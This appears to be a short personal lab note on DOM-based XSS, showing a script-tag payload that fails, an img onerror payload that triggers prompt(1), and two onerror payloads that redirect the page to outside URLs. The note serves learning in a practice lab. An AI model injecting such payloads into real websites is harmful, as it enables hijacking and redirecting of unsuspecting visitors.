### **DOM BASED XSS : Client side only**

#### Lab -- XSS 0x1

![[xss lab 1.png]]
-  Here if we type 
```javascript
<script>prompt(1)</script>
```

![[xss lab 2.png]]
-  The reason why it didn't load anytime after we typed that script is because that component is not a part of any thing.

-  **Consider this :**
```javascript
<img src=x onerror="prompt(1)">
```

![[xss lab 3.png]]
-  Now the reason why this worked is why the image source failed to load x, it executed on error. resulting in that prompt.

-  **Here is another example on how you can redirect to another page.**
```javascript

<img src=x onerror="window.location.href='https://crypter-xi.vercel.app'">
<img src=x onerror="window.location.href='https://youtu.be/dQw4w9WgXcQ?si=LKoNh8imMiFhsi9O'">
```
